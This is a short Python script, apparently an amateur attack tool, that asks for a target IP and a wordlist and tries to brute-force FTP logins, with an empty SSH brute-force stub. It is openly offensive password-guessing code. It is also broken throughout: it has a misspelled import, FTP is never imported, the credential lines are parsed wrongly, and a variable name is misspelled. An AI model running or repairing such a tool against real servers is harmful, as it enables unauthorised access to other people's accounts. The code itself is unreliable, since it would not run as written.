import ftpllib

host = input("Specify your target IP: ")
wordlist = input("Specify your wordlist path: ")

def ssh_brute():
	pass

def ftp_brute(host, wordlist):
	initialized = False
	try:
		print("Opening wordlist...", end="")
		w = open(wordlist, 'r')
		if w:
			print("OK")
	except:
		print("Failed")

	for line in w:
		usr = line[0].split(':')
		passw = line[1].split(':').strip('\n')
		print("Trying to login with " + usr + " / " + passw)
		try:
			ftp = FTP(host)
			auth = ftp.login(usr, passw)
			print("Login succeed. Login: " + usr + "Password: " + passw)
			initialized = True
		except:
			pass

	if not initialized: print("Attack failed! No login/password found!")



def main():
	ftp_brute(host, wordist)



if __name__ == "__main__":
	main()
